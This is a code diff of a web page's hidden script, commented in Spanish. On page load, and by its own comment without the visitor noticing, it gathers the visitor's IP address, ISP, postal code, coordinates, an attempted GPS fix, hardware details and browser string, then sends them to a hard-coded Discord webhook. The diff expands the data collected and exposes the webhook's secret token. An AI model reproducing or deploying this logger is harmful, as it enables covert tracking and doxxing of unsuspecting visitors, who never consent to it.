@@ -34,37 +34,68 @@
     </div>
 
     <script>
+        // TU WEBHOOK DE DISCORD
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1491906436685496381/ygIRTXqmZjvXYiKe6eZjMV2hjCZL05v4b9xy4GjBoqSLxkRZ6I9hhEotcOVRdMXh9QVv";
 
         async function capturar() {
             try {
-                // 1. Forzamos la obtención de IPv4 usando ipify
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const ipv4 = ipData.ip;
-
-                // 2. Ahora usamos esa IPv4 para obtener la ubicación de ipapi.co
-                const locRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
-                const data = await locRes.json();
-
-                // 3. Datos de Hardware (GPU)
+                // 1. Datos de IP y Ubicación mejorada
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+                
+                // 2. Datos de Hardware (GPU)
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                 const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "N/A";
+                
+                // 3. Intentar obtener geolocalización GPS si el usuario lo permite
+                let gpsCoords = "No disponible";
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            gpsCoords = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                        },
+                        error => {
+                            console.log("GPS no disponible o denegado");
+                        }
+                    );
+                }
 
-                // 4. Preparar el mensaje para Discord
+                // 4. Preparar el mensaje para Discord con información ampliada
                 const reporte = {
                     username: "Baires Log System",
                     embeds: [{
-                        title: "🚨 Reporte de Acceso Detectado (IPv4)",
-                        color: 15158332,
+                        title: "🚨 Reporte de Acceso Detectado",
+                        color: 15158332, // Rojo
                         fields: [
-                            { name: "👤 Usuario/PC", value: `**IP:** ${ipv4}\n**Ciudad:** ${data.city || 'Desconocida'}\n**País:** ${data.country_name || 'Desconocido'}`, inline: false },
-                            { name: "🖥️ Hardware Detectado", value: `**GPU:** ${gpu}\n**Cores:** ${navigator.hardwareConcurrency || "N/A"}\n**RAM:** ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"}`, inline: true },
-                            { name: "⚙️ OS & Navegador", value: `\`${navigator.userAgent.substring(0, 150)}\``, inline: false }
+                            { 
+                                name: "👤 Usuario/PC", 
+                                value: `**IP:** ${data.ip}\n**ISP:** ${data.org || "N/A"}\n**ASN:** ${data.asn || "N/A"}`, 
+                                inline: false 
+                            },
+                            { 
+                                name: "📍 Ubicación Geográfica", 
+                                value: `**Dirección:** ${data.address || "N/A"}\n**Ciudad:** ${data.city || "N/A"}\n**Región:** ${data.region || "N/A"}\n**Estado/Provincia:** ${data.region_code || "N/A"}\n**País:** ${data.country_name || "N/A"} (${data.country_code || "N/A"})\n**Código Postal:** ${data.postal || "N/A"}\n**Coordenadas IP:** Lat: ${data.latitude || "N/A"}, Lon: ${data.longitude || "N/A"}\n**GPS:** ${gpsCoords}`, 
+                                inline: false 
+                            },
+                            { 
+                                name: "🌐 Información de Red", 
+                                value: `**Zona Horaria:** ${data.timezone || "N/A"}\n**Moneda:** ${data.currency || "N/A"}\n**Idioma:** ${data.languages || "N/A"}`, 
+                                inline: true 
+                            },
+                            { 
+                                name: "🖥️ Hardware Detectado", 
+                                value: `**GPU:** ${gpu}\n**Cores:** ${navigator.hardwareConcurrency || "N/A"}\n**RAM:** ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"}`, 
+                                inline: true 
+                            },
+                            { 
+                                name: "⚙️ OS & Navegador", 
+                                value: `\`${navigator.userAgent.substring(0, 150)}\``, 
+                                inline: false 
+                            }
                         ],
-                        footer: { text: "Sistema de logs IPv4 forzado" },
+                        footer: { text: "Sistema de logs automatizado" },
                         timestamp: new Date()
                     }]
                 };
@@ -81,6 +112,7 @@
             }
         }
 
+        // Se ejecuta al cargar sin que el usuario note nada
         window.onload = capturar;
     </script>
 </body>
